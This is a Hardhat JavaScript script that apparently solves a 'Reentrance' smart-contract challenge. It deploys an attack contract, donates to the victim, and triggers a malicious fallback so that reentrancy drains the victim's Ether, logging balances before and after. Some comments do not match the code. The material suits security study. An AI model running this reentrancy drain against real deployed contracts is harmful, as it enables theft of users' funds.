const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Reentrance");
  const victim = await Victim.attach(
    "0x226c3Bd2bCfB5cbe1209DF612E0109DAb0bD2426" // This is the contract address that you get from starting your instance
  );

  // Check what the balance contract is to drain it
  const provider = hre.ethers.provider;
  const balanceinitial = await provider.getBalance(victim.address); // we see that the contract has 0.001 Ether
  console.log(
    "The balance of the victim contract initially is ",
    balanceinitial.toString()
  );

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("ReentranceAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0x226c3Bd2bCfB5cbe1209DF612E0109DAb0bD2426", // This is the contract address that you get from starting your instance
    { value: 1000000000000000 } // Send 0.001 Ether so that it can donate
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Check the balance of the deployed contract in the victim contract
  const balance1 = await victim.balanceOf(contract.address);
  console.log("The balance of the contract initially is ", balance1.toString());

  // Call donateToTarget from attack contract to pass require statement in withdraw
  const donate = await contract.donateToTarget();
  await donate.wait(1);
  // Now call malicious fallback function from attack contract
  const [owner, addr1] = await ethers.getSigners();
  const attack = await owner.sendTransaction({
    to: contract.address,
    value: 1, // Sends 100 wei ethers.utils.parseEther("1.0") sends exactly 1.0 ether
  });
  await attack.wait(1);

  // Verify what is the balance of victim contract
  const balancefinal = await provider.getBalance(victim.address); // we see that the contract has 0.001 Ether
  console.log(
    "The balance of the victim contract now is ",
    balancefinal.toString()
  );
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
